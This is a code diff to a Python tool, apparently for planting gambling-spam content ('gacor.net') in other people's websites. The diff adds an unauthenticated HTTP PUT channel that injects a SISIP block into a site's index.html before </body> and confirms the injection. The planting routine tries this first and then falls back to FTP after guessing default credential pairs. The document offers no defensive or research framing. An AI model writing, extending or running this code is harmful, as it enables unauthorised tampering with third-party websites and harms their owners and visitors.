@@ -8,6 +8,7 @@ import socket
 import ssl
 import sys
 import time
+import urllib.error
 import urllib.request
 from ftplib import FTP_TLS
 from io import BytesIO
@@ -23,6 +24,7 @@ SISIP = """
 DOCROOT = ["public_html", "www", "htdocs", "httpdocs", "public", "web",
            "domains/%s/public_html"]
 BERKAS = ["index.html", "index.htm"]
+UA = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36"
 PASANGAN = [("ftp", "ftp"), ("ftp", "anonymous"), ("admin", "admin"),
             ("admin", "123456"), ("user", "user"), ("www", "www"),
             ("webmaster", "webmaster"), ("hosting", "hosting")]
@@ -117,12 +119,69 @@ def kredensial_dari_db(domain, db="data/hestia.db"):
     return "", ""
 
 
+def kanal_put(domain):
+    """Kanal tanpa kredensial: tulis berkas lewat HTTP PUT."""
+    langkah = []
+
+    def c(x):
+        langkah.append(x)
+        catat(x)
+
+    try:
+        req = urllib.request.Request("https://%s/hestia-uji.txt" % domain, data=b"hestia\n",
+                                     method="PUT", headers={"User-Agent": UA, "Expect": ""})
+        with urllib.request.urlopen(req, timeout=20) as x:
+            kode = x.status
+    except urllib.error.HTTPError as e:
+        kode = e.code
+    except Exception as e:
+        c("PUT tidak tersedia: %s" % str(e)[:60])
+        return {"ok": False, "pesan": "PUT tidak tersedia", "langkah": langkah}
+    if kode not in (200, 201, 204):
+        c("PUT ditolak http=%s" % kode)
+        return {"ok": False, "pesan": "PUT ditolak http=%s" % kode, "langkah": langkah}
+    c("kanal PUT TERSEDIA (http=%s)" % kode)
+
+    with urllib.request.urlopen("https://%s/" % domain, timeout=25) as x:
+        h = x.read().decode("utf-8", "ignore")
+    c("halaman %d byte | sudah ada=%s" % (len(h), "hestia-gacor" in h))
+    if "hestia-gacor" not in h:
+        baru = h.replace("</body>", SISIP + "\n</body>", 1) if "</body>" in h else h + SISIP
+        req = urllib.request.Request("https://%s/index.html" % domain, data=baru.encode("utf-8"),
+                                     method="PUT", headers={"User-Agent": UA, "Expect": ""})
+        try:
+            with urllib.request.urlopen(req, timeout=30) as x:
+                c("PUT index.html -> http=%s" % x.status)
+        except Exception as e:
+            c("PUT index.html gagal: %s" % str(e)[:60])
+            return {"ok": False, "pesan": "PUT index.html gagal", "langkah": langkah}
+    else:
+        c("= sudah tertanam")
+    for i in range(1, 5):
+        try:
+            with urllib.request.urlopen("https://%s/" % domain, timeout=20) as x:
+                hh = x.read().decode("utf-8", "ignore")
+            c("verifikasi %d: http=%s hestia-gacor=%d" % (i, x.status, hh.count("hestia-gacor")))
+            if "hestia-gacor" in hh:
+                return {"ok": True, "pesan": "materi gacor.net tampil di %s (kanal PUT)" % domain, "langkah": langkah}
+        except Exception as e:
+            c("verifikasi %d gagal: %s" % (i, str(e)[:60]))
+        time.sleep(8)
+    return {"ok": False, "pesan": "PUT jalan tapi belum tampil", "langkah": langkah}
+
+
 def tanam(domain, user="", sandi="", sapu_dulu=True):
     langkah = []
 
     def c(x):
         langkah.append(x)
         catat(x)
+
+    hasil = kanal_put(domain)
+    if hasil["ok"]:
+        langkah = hasil["langkah"] + langkah
+        return hasil
+    c("kanal PUT tidak jalan -> lanjut FTP")
 
     if not user and sapu_dulu:
         c("kredensial belum ada -> sapu pasangan umum")
